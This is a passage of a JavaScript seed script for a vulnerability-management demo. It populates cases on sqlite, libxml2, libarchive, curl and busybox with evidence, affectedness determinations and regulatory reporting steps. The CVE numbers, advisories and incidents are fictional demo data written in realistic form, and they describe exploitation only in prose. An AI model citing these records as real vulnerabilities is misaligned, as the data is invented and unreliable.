    content: JSON.stringify({ bomFormat: 'CycloneDX', specVersion: '1.5', note: 'fictional demo excerpt', components: [{ name: 'sqlite', version: '3.42.0', purl: 'pkg:generic/sqlite@3.42.0', properties: [{ name: 'build:fts5', value: 'enabled' }] }] }, null, 2),
  })
  s.determination('c9.det', A('2026-09-12T10:10:00Z'), {
    caseKey: 'c9', productId: 'PRD-SCA', analystId: 'u-eng', confidence: 'HIGH',
    rationale: 'The agent indexes event text from monitored applications with FTS5. Exploitation observed against the shipped agent at the MSP partner.',
    answers: {
      component_present: exposedYes('SBOM lists sqlite 3.42.0.', ['c9.sbom']),
      vulnerable_version: exposedYes('3.42.0 < 3.44.0.', ['c9.sbom']),
      functionality_enabled: exposedYes('Built with FTS5.', ['c9.sbom']),
      feature_reachable: exposedYes('Event queue search indexes all event text.'),
      exploit_path: exposedYes('Event text originates from monitored applications.'),
      configuration_mitigates: ['NO', ''],
      compensating_control: ['NO', ''],
      exploitation_demonstrated: ['YES', 'IR-0907.', ['c9.ir']],
      product_validation: ['YES', 'Crash signature matches the shipped 7.1.0 build.', ['c9.log']],
    },
  })
  s.decision('c9.dec', A('2026-09-12T11:30:00Z'), {
    caseKey: 'c9', analystId: 'u-lead', outcome: 'REPORT', confidence: 'HIGH', evidenceKeys: ['c9.ir', 'c9.log'],
    exploitationBasis: 'IR-0907 confirmed exploitation of shipped agents at an MSP partner.',
    rationale: 'Exploitation began on 10 Sep, before the application date, but Tessaline became aware of the vulnerability on 11 Sep and of its exploitation on 12 Sep. Both awareness dates fall after application. The agent is affected and made available in the EU. Report.',
  })
  s.report('c9.ew', A('2026-09-12T12:00:00Z'), { caseKey: 'c9', kind: 'EARLY_WARNING', userId: 'u-analyst2' })
  s.transition(A('2026-09-12T12:05:00Z'), 'c9.ew', 'INTERNAL_REVIEW', 'u-analyst2')
  s.review(A('2026-09-12T13:10:00Z'), { caseKey: 'c9', reportKey: 'c9.ew', reviewerId: 'u-mgr', action: 'APPROVE', comment: 'Approved.' })
  s.transition(A('2026-09-12T13:15:00Z'), 'c9.ew', 'READY', 'u-lead')
  s.submit(A('2026-09-12T13:20:00Z'), 'c9.ew', 'u-lead')
  s.transition(A('2026-09-12T15:00:00Z'), 'c9.ew', 'ACKNOWLEDGED', 'u-analyst2', 'Acknowledgement received (simulated).')
  s.report('c9.notif', A('2026-09-13T14:00:00Z'), { caseKey: 'c9', kind: 'VULNERABILITY_NOTIFICATION', userId: 'u-analyst2' })
  s.transition(A('2026-09-13T14:10:00Z'), 'c9.notif', 'INTERNAL_REVIEW', 'u-analyst2')
  s.review(A('2026-09-14T08:40:00Z'), { caseKey: 'c9', reportKey: 'c9.notif', reviewerId: 'u-mgr', action: 'APPROVE', comment: 'Technical content approved.' })
  s.review(A('2026-09-14T09:00:00Z'), { caseKey: 'c9', reportKey: 'c9.notif', reviewerId: 'u-comp', action: 'APPROVE', comment: 'Content meets the Art. 14(2)(b) scope.' })
  s.transition(A('2026-09-14T10:20:00Z'), 'c9.notif', 'READY', 'u-lead')
  s.submit(A('2026-09-14T10:30:00Z'), 'c9.notif', 'u-lead')
  s.transition(A('2026-09-14T13:00:00Z'), 'c9.notif', 'ACKNOWLEDGED', 'u-analyst2', 'Acknowledgement received (simulated).')
  s.evidence('c9.release', A('2026-09-18T15:10:00Z'), {
    caseKey: 'c9', type: 'TICKET', title: 'Release record: SecureConnect Agent 7.1.1 (sqlite 3.44.0)', description: 'Corrective update published.',
    source: 'Release management (build server)', sourceCreatedAt: A('2026-09-18T15:00:00Z'), ownerId: 'u-eng', fileName: 'REL-7.1.1.txt',
    content: 'REL-7.1.1  SecureConnect Agent  published 2026-09-18 15:00 UTC  sqlite 3.44.0 (fictional, demo data)\n',
  })
  s.event('c9.measure', A('2026-09-18T15:20:00Z'), {
    caseKey: 'c9', type: 'MEASURE_AVAILABLE', occurredAt: A('2026-09-18T15:00:00Z'), timezone: 'UTC', actorId: 'u-eng',
    source: 'Release record REL-7.1.1 (build server)', sourceKind: 'system_of_record', evidenceKeys: ['c9.release'],
  })
  s.report('c9.final', A('2026-09-24T09:00:00Z'), { caseKey: 'c9', kind: 'FINAL_REPORT', userId: 'u-analyst2' })
  s.transition(A('2026-09-24T09:10:00Z'), 'c9.final', 'INTERNAL_REVIEW', 'u-analyst2')
  s.review(A('2026-09-24T13:00:00Z'), { caseKey: 'c9', reportKey: 'c9.final', reviewerId: 'u-mgr', action: 'APPROVE', comment: 'Root cause and fleet uptake documented.' })
  s.review(A('2026-09-24T14:30:00Z'), { caseKey: 'c9', reportKey: 'c9.final', reviewerId: 'u-comp', action: 'APPROVE', comment: 'Approved for submission.' })
  s.transition(A('2026-09-24T15:30:00Z'), 'c9.final', 'READY', 'u-lead')
  s.submit(A('2026-09-24T16:00:00Z'), 'c9.final', 'u-lead')
  s.transition(A('2026-09-25T10:00:00Z'), 'c9.final', 'ACKNOWLEDGED', 'u-analyst2', 'Acknowledgement received (simulated).')
  for (const k of ['c9.ew', 'c9.notif', 'c9.final']) s.transition(A('2026-09-26T08:50:00Z'), k, 'CLOSED', 'u-lead', 'Case complete.')
  s.lifecycle(A('2026-09-26T09:00:00Z'), 'c9', 'closed', 'All three notifications submitted and acknowledged (simulated). Corrective update 7.1.1 deployed to 94% of the managed fleet.', 'u-mgr')

  // ===========================================================================
  // libxml2 -- not affected, three different justifications
  // ===========================================================================
  s.vulnerability('v.libxml2', A('2026-09-16T08:00:00Z'), {
    cve: 'CVE-2026-990311',
    title: 'Unbounded entity expansion in the xmlreader pull parser',
    cwe: 'CWE-776',
    cvssScore: 6.5,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H',
    severity: 'MEDIUM',
    description: 'The xmlreader API expands nested entity references without a depth limit, allowing a crafted document to exhaust memory. Fictional vulnerability for the NEXUS demo.',
    componentId: 'CMP-LIBXML2',
    affectedVersions: '<2.12.0',
    fixedVersion: '2.12.0',
    exploitability: 'Requires attacker-supplied XML reaching the xmlreader API',
    exploitation: 'UNKNOWN',
    source: 'Nightly SBOM scan',
    discoveredAt: '2026-09-16T08:05:00.000Z',
    vendorAdvisory: 'https://advisories.example/libxml2/2026-09-15',
    threatIntelReference: null,
  }, 'u-eng')
  s.evidence('c5.scan', A('2026-09-16T10:01:00Z'), {
    caseKey: 'c5', type: 'SCANNER_RESULT', title: 'Nightly SBOM scan: libxml2 in three products', description: 'Scanner output listing affected component versions.',
    source: 'Nightly SBOM scan job (CI)', sourceCreatedAt: A('2026-09-16T08:05:00Z'), ownerId: 'u-analyst', fileName: 'scan-20260916-libxml2.json',
    content: JSON.stringify({ job: 'SCAN-20260916', note: 'fictional demo data', finding: 'CVE-2026-990311', matches: [{ product: 'SecureEdge Gateway 4.2.1', component: 'libxml2', version: '2.10.3' }, { product: 'BridgeCloud Console 2026.3', component: 'libxml2', version: '2.11.5', layer: 'base image' }, { product: 'RemoteOps Controller 2.8.0', component: 'libxml2', version: '2.9.14' }] }, null, 2),
  })
  s.openCase('c5', A('2026-09-16T10:00:00Z'), {
    title: 'libxml2 entity expansion -- three products flagged by SBOM scan', vulnKey: 'v.libxml2', productIds: ['PRD-SEG', 'PRD-BCC', 'PRD-ROC'],
    ownerId: 'u-analyst', createdBy: 'u-analyst', collaboratorIds: ['u-eng'], tags: ['xml', 'sbom-scan'],
    summary: 'The scanner found the component in three products. Whether any product is affected is a separate question.',
  })
  s.event('c5.detection', A('2026-09-16T10:02:00Z'), {
    caseKey: 'c5', type: 'DETECTION', occurredAt: A('2026-09-16T08:10:00Z'), timezone: 'UTC', actorId: 'u-analyst',
    source: 'Nightly SBOM scan job SCAN-20260916 (CI server clock)', sourceKind: 'system_of_record', evidenceKeys: ['c5.scan'],
  })
  s.evidence('c5.ticket', A('2026-09-16T12:20:00Z'), {
    caseKey: 'c5', type: 'TICKET', title: 'PSIRT-2231 confirmation record', description: 'Component confirmed present in three shipped products.',
    source: 'PSIRT tracker', sourceCreatedAt: A('2026-09-16T12:30:00Z'), ownerId: 'u-mgr', fileName: 'PSIRT-2231.txt',
    content: `PSIRT-2231  libxml2 xmlreader entity expansion\n2026-09-16 12:30 UTC  state Triage -> Confirmed by daniel.okafor (security-team confirmation)\n"Present in three shipped products. Affectedness per product to follow."\n`,
  })
  s.event('c5.va', A('2026-09-16T12:33:00Z'), {
    caseKey: 'c5', type: 'VULNERABILITY_AWARENESS', occurredAt: A('2026-09-16T12:30:00Z'), timezone: 'Europe/Berlin', actorId: 'u-mgr',
    source: 'PSIRT tracker: PSIRT-2231 state Triage -> Confirmed', sourceKind: 'system_of_record', evidenceKeys: ['c5.ticket'], criterionId: 'AC-02',
  })
  s.intel(A('2026-09-17T09:00:00Z'), 'v.libxml2', {
    source: 'Manual check of partner feeds and public exploitation catalogues', observed: false, firstObserved: null, confidence: 'MEDIUM',
    indicator: 'None', reference: 'Checked 17 Sep 2026; no exploitation reports.', analystId: 'u-analyst',
  })
  s.exploitation(A('2026-09-17T09:05:00Z'), 'v.libxml2', 'NOT_OBSERVED', 'u-analyst', 'c5')
  s.evidence('c5.tinote', A('2026-09-17T09:10:00Z'), {
    caseKey: 'c5', type: 'THREAT_INTELLIGENCE', title: 'Exploitation check: no reports', description: 'Record of the exploitation check and sources consulted.',
    source: 'PSIRT analyst note', sourceCreatedAt: A('2026-09-17T09:00:00Z'), ownerId: 'u-analyst', fileName: 'exploitation-check-libxml2.txt',
    content: 'Exploitation check 2026-09-17 09:00 UTC (fictional, demo data)\nPartner feeds: no reports. Public exploitation catalogues: not listed. Vendor: no known exploitation.\nConclusion: NOT OBSERVED. Re-check scheduled weekly while the case is open.\n',
  })
  s.evidence('c5.cfg-seg', A('2026-09-18T09:00:00Z'), {
    caseKey: 'c5', type: 'CONFIGURATION', title: 'config-agent: signature verified before parsing', description: 'Source excerpt from the SecureEdge config agent.',
    source: 'Source repository (gateway, tag 4.2.1)', sourceCreatedAt: A('2026-07-30T10:00:00Z'), ownerId: 'u-eng', fileName: 'config-agent-excerpt.txt',
    content: `/* gateway/config-agent/bundle.c @ tag 4.2.1 (fictional excerpt) */\nif (!ed25519_verify(bundle->sig, bundle->body, bundle->len, vendor_pubkey))\n    return ERR_BAD_SIGNATURE;           /* rejected before any parsing */\nreader = xmlReaderForMemory(bundle->body, bundle->len, NULL, NULL, XML_PARSE_NONET);\n`,
  })
  s.evidence('c5.val-seg', A('2026-09-18T10:40:00Z'), {
    caseKey: 'c5', type: 'ANALYST_NOTE', title: 'Validation: unsigned bundles rejected before libxml2', description: 'Fuzzing run against the shipped config agent.',
    source: 'Product security lab notebook', sourceCreatedAt: A('2026-09-18T10:30:00Z'), ownerId: 'u-eng', fileName: 'validation-seg-libxml2.txt',
    content: 'Validation 2026-09-18 (fictional, demo data)\n10,000 crafted entity-expansion documents submitted as unsigned bundles to config-agent on a 4.2.1 image.\nResult: 10,000 rejected with ERR_BAD_SIGNATURE; xmlReaderForMemory never reached (uprobe count 0).\n',
  })
  s.determination('c5.det.seg', A('2026-09-18T11:00:00Z'), {
    caseKey: 'c5', productId: 'PRD-SEG', analystId: 'u-eng', confidence: 'HIGH',
    rationale: 'Only vendor-signed configuration bundles reach the parser. The signature is verified before parsing, so an adversary cannot supply the input that triggers the flaw.',
    answers: {
      component_present: exposedYes('libxml2 2.10.3.', ['c5.scan']),
      vulnerable_version: exposedYes('2.10.3 < 2.12.0.', ['c5.scan']),
      functionality_enabled: exposedYes('config-agent uses xmlreader.'),
      feature_reachable: exposedYes('xmlReaderForMemory is called for every bundle.', ['c5.cfg-seg']),
      exploit_path: ['NO', 'Signature check precedes parsing; input is not adversary-controlled.', ['c5.cfg-seg', 'c5.val-seg']],
      product_validation: ['YES', 'Fuzzing run on the shipped 4.2.1 image.', ['c5.val-seg']],
    },
  })
  s.evidence('c5.bcc-trace', A('2026-09-18T14:00:00Z'), {
    caseKey: 'c5', type: 'LOG', title: 'Runtime library trace: BridgeCloud Console image', description: 'No console process maps libxml2.',
    source: 'Container runtime trace', sourceCreatedAt: A('2026-09-18T13:50:00Z'), ownerId: 'u-eng', fileName: 'bcc-runtime-trace.log',
    content: 'runtime trace 2026-09-18 13:50 UTC, console 2026.3, 30 min load test (fictional, demo data)\npid 1 java  maps: libjvm.so libz.so.1 libc.so.6 ... (no libxml2)\npid 57 healthcheck  maps: libc.so.6\nlibxml2.so.2 present at /usr/lib but not mapped by any process\n',
  })
  s.determination('c5.det.bcc', A('2026-09-18T15:00:00Z'), {
    caseKey: 'c5', productId: 'PRD-BCC', analystId: 'u-eng', confidence: 'HIGH',
    rationale: 'libxml2 is present in the container base image, but no console process loads it. The vulnerable code is not in any execution path.',
    answers: {
      component_present: exposedYes('libxml2 2.11.5 in the base image layer.', ['c5.scan']),
      vulnerable_version: exposedYes('2.11.5 < 2.12.0.', ['c5.scan']),
      functionality_enabled: exposedYes('Library compiled with xmlreader.'),
      feature_reachable: ['NO', 'No process maps the library at runtime.', ['c5.bcc-trace']],
      product_validation: ['YES', 'Runtime trace under load.', ['c5.bcc-trace']],
    },
  })
  s.evidence('c5.roc-build', A('2026-09-19T09:00:00Z'), {
    caseKey: 'c5', type: 'CONFIGURATION', title: 'RemoteOps build configuration: libxml2 without reader', description: 'Build recipe showing --without-reader.',
    source: 'Build recipes (controller, 2.8.0)', sourceCreatedAt: A('2026-05-12T09:00:00Z'), ownerId: 'u-eng', fileName: 'roc-libxml2-recipe.txt',
    content: '# recipes/libxml2/libxml2_2.9.14.bb (fictional excerpt)\nEXTRA_OECONF = "--without-reader --without-python --without-http --without-ftp"\n',
  })
  s.determination('c5.det.roc', A('2026-09-19T10:30:00Z'), {
    caseKey: 'c5', productId: 'PRD-ROC', analystId: 'u-eng', confidence: 'HIGH',
    rationale: 'RemoteOps builds libxml2 without the xmlreader API. The vulnerable code is not compiled into the shipped product.',
    answers: {
      component_present: exposedYes('libxml2 2.9.14.', ['c5.scan']),
      vulnerable_version: exposedYes('2.9.14 < 2.12.0.', ['c5.scan']),
      functionality_enabled: ['NO', 'Built --without-reader.', ['c5.roc-build']],
      product_validation: ['YES', 'nm on the shipped library: no xmlReader* symbols.', ['c5.roc-build']],
    },
  })
  s.decision('c5.dec', A('2026-09-19T15:00:00Z'), {
    caseKey: 'c5', analystId: 'u-analyst', outcome: 'DO_NOT_REPORT', nonReportReason: 'NOT_AFFECTED', confidence: 'HIGH', recordKey: 'c5.record',
    evidenceKeys: ['c5.val-seg', 'c5.bcc-trace', 'c5.roc-build', 'c5.tinote'],
    exploitationBasis: 'Exploitation check on 17 Sep: no reports from partner feeds, public catalogues or the vendor.',
    rationale: 'None of the three products is affected, each for a different, evidenced reason: SecureEdge only parses signed bundles (adversary cannot control input), BridgeCloud Console never loads the library (not in execute path), RemoteOps does not compile the xmlreader API (code not present). Exploitation is also not observed. Reporting is not required.',
  })
  s.review(A('2026-09-20T09:30:00Z'), { caseKey: 'c5', reportKey: 'c5.record', reviewerId: 'u-comp', action: 'APPROVE', comment: 'Each not-affected determination is product-specific and carries validation evidence. Approved.' })
  s.transition(A('2026-09-20T09:45:00Z'), 'c5.record', 'CLOSED', 'u-analyst', 'Decision record filed.')

  // ===========================================================================
  // libarchive -- final-report clock running
  // ===========================================================================
  const T4 = T - 9 * D
  s.vulnerability('v.libarchive', T4 - 5.5 * H, {
    cve: 'CVE-2026-990538',
    title: 'Out-of-bounds write in RAR5 filter processing',
    cwe: 'CWE-787',
    cvssScore: 8.8,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
    severity: 'HIGH',
    description: 'A crafted RAR5 archive with an oversized filter block writes past the end of the window buffer during extraction. Fictional vulnerability for the NEXUS demo.',
    componentId: 'CMP-LIBARCHIVE',
    affectedVersions: '<3.7.4',
    fixedVersion: '3.7.4',
    exploitability: 'Network, low-privileged user uploads an archive',
    exploitation: 'SUSPECTED',
    source: 'Customer support escalation',
    discoveredAt: iso(T4 - 6 * H),
    vendorAdvisory: 'https://advisories.example/libarchive/rar5-filter',
    threatIntelReference: null,
  }, 'u-analyst2')
  s.evidence('c4.ticket', T4 - 5.15 * H, {
    caseKey: 'c4', type: 'TICKET', title: 'SUP-88412: archive preview crash with suspicious upload', description: 'Customer support escalation.',
    source: 'Service desk', sourceCreatedAt: T4 - 6 * H, ownerId: 'u-analyst2', fileName: 'SUP-88412.txt',
    content: `SUP-88412 (fictional, demo data)\nOpened ${iso(T4 - 6 * H)} by customer tenant admin.\n"Preview worker crashed after a user uploaded invoices.rar; a new cron job appeared on the appliance."\nEscalated to PSIRT ${iso(T4 - 5.5 * H)}\n`,
  })
  s.openCase('c4', T4 - 5.2 * H, {
    title: 'libarchive RAR5 out-of-bounds write -- VaultSync preview', vulnKey: 'v.libarchive', productIds: ['PRD-VSY'], ownerId: 'u-analyst2', createdBy: 'u-analyst2',
    collaboratorIds: ['u-eng'], tags: ['archive', 'customer-incident'], summary: 'Customer incident: crafted RAR5 upload led to code execution in the preview worker.',
  })
  s.event('c4.detection', T4 - 5.1 * H, {
    caseKey: 'c4', type: 'DETECTION', occurredAt: T4 - 6 * H, timezone: 'Europe/Amsterdam', actorId: 'u-analyst2',
    source: 'Customer support ticket SUP-88412 (service desk server clock)', sourceKind: 'system_of_record', evidenceKeys: ['c4.ticket'],
  })
  s.event('c4.va', T4 - 2.9 * H, {
    caseKey: 'c4', type: 'VULNERABILITY_AWARENESS', occurredAt: T4 - 3 * H, timezone: 'Europe/Berlin', actorId: 'u-lead',
    source: 'PSIRT tracker: PSIRT-2244 state Triage -> Confirmed', sourceKind: 'system_of_record', evidenceKeys: ['c4.ticket'], criterionId: 'AC-01',
  })
  s.evidence('c4.ir', T4 - 40 * M, {
    caseKey: 'c4', type: 'INCIDENT_RECORD', title: 'IR-0944: VaultSync tenant compromise via RAR5 upload', description: 'Incident response findings at the customer tenant.',
    source: 'Incident response case system', sourceCreatedAt: T4 - 45 * M, ownerId: 'u-lead', fileName: 'IR-0944.txt',
    content: `IR-0944 (fictional, demo data)\nFirst malicious upload in tenant audit log: ${iso(T4 - 2 * D)}\nPreview worker spawned /bin/sh after extracting invoices.rar (RAR5, filter block 0x7fffff00)\nPersistence: cron entry added by the preview worker's user\n`,
  })
  s.evidence('c4.sample', T4 - 30 * M, {
    caseKey: 'c4', type: 'EXPLOIT_EVIDENCE', title: 'Malicious RAR5 sample analysis', description: 'Reproduction of the crash and write primitive against VaultSync 3.4.2.',
    source: 'Product security lab notebook', sourceCreatedAt: T4 - 35 * M, ownerId: 'u-eng', fileName: 'rar5-sample-analysis.txt',
    content: 'Sample invoices.rar sha256 5f1c...e9a0 (fictional, demo data)\nReplayed against VaultSync 3.4.2 preview worker in the lab: out-of-bounds write reproduced; RIP control confirmed.\n',
  })
  s.exploitation(T4 - 10 * M, 'v.libarchive', 'CONFIRMED', 'u-mgr', 'c4')
  s.event('c4.occurrence', T4 - 5 * M, {
    caseKey: 'c4', type: 'OCCURRENCE', occurredAt: T4 - 2 * D, timezone: 'Europe/Amsterdam', actorId: 'u-analyst2',
    source: 'Customer tenant audit log, first malicious upload (via IR-0944)', sourceKind: 'system_of_record', evidenceKeys: ['c4.ir'],
  })
  s.event('c4.ea', T4 + 6 * M, {
    caseKey: 'c4', type: 'EXPLOITATION_AWARENESS', occurredAt: T4, timezone: 'Europe/Berlin', actorId: 'u-mgr',
    source: 'Security Manager validation of IR-0944 and lab reproduction', sourceKind: 'system_of_record', evidenceKeys: ['c4.sample', 'c4.ir'], criterionId: 'AC-03',
  })
  s.determination('c4.det', T4 + 2 * H, {
    caseKey: 'c4', productId: 'PRD-VSY', analystId: 'u-eng', confidence: 'HIGH',
    rationale: 'Archive preview extracts user uploads with RAR5 support enabled. Exploitation reproduced against the shipped build.',
    answers: {
      component_present: exposedYes('libarchive 3.7.1 (SBOM is stale; confirmed from the running image).'),
      vulnerable_version: exposedYes('3.7.1 < 3.7.4.'),
      functionality_enabled: exposedYes('RAR5 enabled for preview.'),
      feature_reachable: exposedYes('Every upload is previewed.'),
      exploit_path: exposedYes('Uploads are user-controlled.'),
      configuration_mitigates: ['NO', ''],
      compensating_control: ['NO', ''],
      exploitation_demonstrated: ['YES', 'IR-0944 and lab reproduction.', ['c4.sample']],
      product_validation: ['YES', 'Lab reproduction on 3.4.2.', ['c4.sample']],
    },
  })
  s.decision('c4.dec', T4 + 3 * H, {
    caseKey: 'c4', analystId: 'u-lead', outcome: 'REPORT', confidence: 'HIGH', evidenceKeys: ['c4.ir', 'c4.sample'],
    exploitationBasis: 'IR-0944 at a customer tenant, reproduced in the lab.',
    rationale: 'Actively exploited at a customer tenant; VaultSync 3.4.2 is affected and made available in the EU. Both awareness dates are after application. Report.',
  })
  s.report('c4.ew', T4 + 4 * H, { caseKey: 'c4', kind: 'EARLY_WARNING', userId: 'u-analyst2' })
  s.transition(T4 + 4.2 * H, 'c4.ew', 'INTERNAL_REVIEW', 'u-analyst2')
  s.review(T4 + 6 * H, { caseKey: 'c4', reportKey: 'c4.ew', reviewerId: 'u-exec', action: 'APPROVE', comment: 'Approved.' })
  s.transition(T4 + 7 * H, 'c4.ew', 'READY', 'u-lead')
  s.submit(T4 + 8 * H, 'c4.ew', 'u-lead')
  s.transition(T4 + 10 * H, 'c4.ew', 'ACKNOWLEDGED', 'u-analyst2', 'Acknowledgement received (simulated).')
  s.report('c4.notif', T4 + 44 * H, { caseKey: 'c4', kind: 'VULNERABILITY_NOTIFICATION', userId: 'u-analyst2' })
  s.transition(T4 + 44.2 * H, 'c4.notif', 'INTERNAL_REVIEW', 'u-analyst2')
  s.review(T4 + 48 * H, { caseKey: 'c4', reportKey: 'c4.notif', reviewerId: 'u-mgr', action: 'APPROVE', comment: 'Approved.' })
  s.review(T4 + 49 * H, { caseKey: 'c4', reportKey: 'c4.notif', reviewerId: 'u-comp', action: 'APPROVE', comment: 'Approved.' })
  s.transition(T4 + 49.5 * H, 'c4.notif', 'READY', 'u-lead')
  s.submit(T4 + 50 * H, 'c4.notif', 'u-lead')
  s.transition(T4 + 53 * H, 'c4.notif', 'ACKNOWLEDGED', 'u-analyst2', 'Acknowledgement received (simulated).')
  s.evidence('c4.release', T4 + 5 * D + 20 * M, {
    caseKey: 'c4', type: 'TICKET', title: 'Release record: VaultSync 3.4.3 (libarchive 3.7.4)', description: 'Corrective update published.',
    source: 'Release management (build server)', sourceCreatedAt: T4 + 5 * D, ownerId: 'u-eng', fileName: 'REL-3.4.3.txt',
    content: `REL-3.4.3  VaultSync  published ${iso(T4 + 5 * D)}  libarchive 3.7.4 (fictional, demo data)\n`,
  })
  s.event('c4.measure', T4 + 5 * D + 30 * M, {
    caseKey: 'c4', type: 'MEASURE_AVAILABLE', occurredAt: T4 + 5 * D, timezone: 'UTC', actorId: 'u-eng',
    source: 'Release record REL-3.4.3 (build server)', sourceKind: 'system_of_record', evidenceKeys: ['c4.release'],
  })
  s.comment(T4 + 5 * D + 2 * H, { caseKey: 'c4', authorId: 'u-lead', body: `@Compliance 3.4.3 is out, so the final-report clock is running (due ${iso(T4 + 19 * D).slice(0, 10)}). Drafting once the fleet-uptake numbers land.` })

  // ===========================================================================
  // curl -- reachability unknown, under investigation
  // ===========================================================================
  const T7 = T - 28 * H
  s.vulnerability('v.curl', T7 - 20 * M, {
    cve: 'CVE-2026-990705',
    title: 'Cookie jar path traversal on write',
    cwe: 'CWE-22',
    cvssScore: 6.1,
    cvssVector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:L',
    severity: 'MEDIUM',
    description: 'When the cookie jar file name is derived from server-supplied data, a crafted Set-Cookie sequence can direct the jar write outside the intended directory. Fictional vulnerability for the NEXUS demo.',
    componentId: 'CMP-CURL',
    affectedVersions: '>=7.80.0 <8.6.0',
    fixedVersion: '8.6.0',
    exploitability: 'Network, requires a malicious or compromised server',
    exploitation: 'UNKNOWN',
    source: 'Upstream advisory mailing list',
    discoveredAt: iso(T7 - 1.5 * H),
    vendorAdvisory: 'https://advisories.example/curl/cookie-jar',
    threatIntelReference: null,
  }, 'u-analyst2')
  s.evidence('c7.advisory', T7 + 2 * M, {
    caseKey: 'c7', type: 'VENDOR_ADVISORY', title: 'Upstream advisory: curl cookie jar path traversal', description: 'Advisory text.', source: 'Upstream advisory mailing list',
    sourceCreatedAt: T7 - 1.5 * H, ownerId: 'u-analyst2', fileName: 'advisory-curl-cookiejar.txt',
    links: [{ targetType: 'vulnerability', key: 'v.curl' }],
    content: 'UPSTREAM ADVISORY (fictional, demo data)\nCVE-2026-990705 curl >=7.80.0 <8.6.0\nCookie jar path traversal when the jar file name is derived from server-supplied data.\n',
  })
  s.openCase('c7', T7, {
    title: 'curl cookie jar traversal -- SecureConnect Agent update client', vulnKey: 'v.curl', productIds: ['PRD-SCA'], ownerId: 'u-analyst2', createdBy: 'u-analyst2',
    collaboratorIds: ['u-eng'], tags: ['update-client'], summary: 'Agent update client uses curl with a cookie jar. Reachability of the vulnerable path is not established.',
  })
  s.event('c7.detection', T7 + 5 * M, {
    caseKey: 'c7', type: 'DETECTION', occurredAt: T7 - 1 * H, timezone: 'UTC', actorId: 'u-analyst2',
    source: 'Upstream advisory mailing list (mail server message trace)', sourceKind: 'system_of_record', evidenceKeys: ['c7.advisory'],
  })
  s.evidence('c7.ticket', T7 + 1.8 * H, {
    caseKey: 'c7', type: 'TICKET', title: 'PSIRT-2258 confirmation record', description: 'Agent ships curl 8.4.0 with cookie jar enabled.', source: 'PSIRT tracker',
    sourceCreatedAt: T7 + 2 * H, ownerId: 'u-lead', fileName: 'PSIRT-2258.txt',
    content: `PSIRT-2258  curl cookie jar traversal\n${iso(T7 + 2 * H)}  state Triage -> Confirmed by jonas.weber\n`,
  })
  s.event('c7.va', T7 + 2.1 * H, {
    caseKey: 'c7', type: 'VULNERABILITY_AWARENESS', occurredAt: T7 + 2 * H, timezone: 'Europe/Berlin', actorId: 'u-lead',
    source: 'PSIRT tracker: PSIRT-2258 state Triage -> Confirmed', sourceKind: 'system_of_record', evidenceKeys: ['c7.ticket'], criterionId: 'AC-01',
  })
  s.intel(T7 + 5 * H, 'v.curl', {
    source: 'Underground forum monitoring (partner feed, unverified)', observed: true, firstObserved: null, confidence: 'LOW',
    indicator: 'Forum post claims a working exploit against "agent update channels"', reference: 'https://intel.example/forum-watch/88213', analystId: 'u-analyst2',
  })
  s.exploitation(T7 + 5.2 * H, 'v.curl', 'SUSPECTED', 'u-analyst2', 'c7')
  s.evidence('c7.cfg', T7 + 7 * H, {
    caseKey: 'c7', type: 'CONFIGURATION', title: 'Update client configuration (7.1.0 default)', description: 'Default updater configuration shipped with the agent.',
    source: 'Agent build (7.1.0)', sourceCreatedAt: T - 40 * D, ownerId: 'u-eng', fileName: 'updater.conf',
    content: '# /etc/secureconnect/updater.conf (7.1.0 default, fictional)\nmirror = https://updates.tessaline.example/agent\ncookie_jar = ${STATE_DIR}/mirrors/${MIRROR_ID}.jar\nfollow_redirects = true\n',
  })
  s.determination('c7.det', T - 20 * H, {
    caseKey: 'c7', productId: 'PRD-SCA', analystId: 'u-eng', confidence: 'LOW',
    rationale: 'The update client ships curl 8.4.0 with a cookie jar enabled. The jar path includes MIRROR_ID, whose origin (static configuration or server-supplied redirect) has not been established.',
    unresolved: 'Product exploitability has not been validated against production configuration.',
    nextAction: 'Validate cookie-jar path handling against the production update configuration',
    nextActionOwnerId: 'u-eng',
    nextActionDue: T + 20 * H,
    answers: {
      component_present: exposedYes('curl 8.4.0.', ['c7.cfg']),
      vulnerable_version: exposedYes('8.4.0 in >=7.80.0 <8.6.0.'),
      functionality_enabled: exposedYes('cookie_jar configured by default.', ['c7.cfg']),
      feature_reachable: ['UNKNOWN', 'Whether MIRROR_ID can be influenced by a redirect is not established.'],
    },
  })
  s.comment(T - 6 * H, { caseKey: 'c7', authorId: 'u-eng', body: '@PSIRT reachability analysis in progress. I need a production updater config from one MSP partner to confirm where MIRROR_ID comes from.' })

  // ===========================================================================
  // busybox -- 24h pressure; one product affected, one not
  // ===========================================================================
  const T2 = T - 23 * H
  s.vulnerability('v.busybox', T2 - 10 * M, {
    cve: 'CVE-2026-990422',
    title: 'Command injection in udhcpc option 121 handling',
    cwe: 'CWE-78',
    cvssScore: 8.8,
    cvssVector: 'CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    severity: 'HIGH',
    description: 'udhcpc passes classless static route data (option 121) to its hook script without sanitisation, allowing a rogue DHCP server on the local network to execute commands as root. Fictional vulnerability for the NEXUS demo.',
    componentId: 'CMP-BUSYBOX',
    affectedVersions: '<1.36.2',
    fixedVersion: '1.36.2',
    exploitability: 'Adjacent network, unauthenticated (rogue DHCP server)',
    exploitation: 'SUSPECTED',
    source: 'National CERT ICS advisory (fictional)',
    discoveredAt: iso(T2 - 40 * M),
    vendorAdvisory: 'https://ics-advisories.example/2026/ICSA-26-272-01',
    threatIntelReference: null,
  }, 'u-analyst')
  s.evidence('c2.advisory', T2 + 11 * M, {
    caseKey: 'c2', type: 'VENDOR_ADVISORY', title: 'ICS advisory ICSA-26-272-01: udhcpc option 121 injection', description: 'National CERT ICS advisory.',
    source: 'ICS advisory subscription', sourceCreatedAt: T2 - 40 * M, ownerId: 'u-analyst', fileName: 'ICSA-26-272-01.txt',
    links: [{ targetType: 'vulnerability', key: 'v.busybox' }],
    content: 'ICS ADVISORY ICSA-26-272-01 (fictional, demo data)\nbusybox udhcpc < 1.36.2: command injection via DHCP option 121\nReports of exploitation on plant networks: under investigation\nMitigation: disable DHCP on OT interfaces; use static addressing\n',
  })
  s.openCase('c2', T2 + 10 * M, {
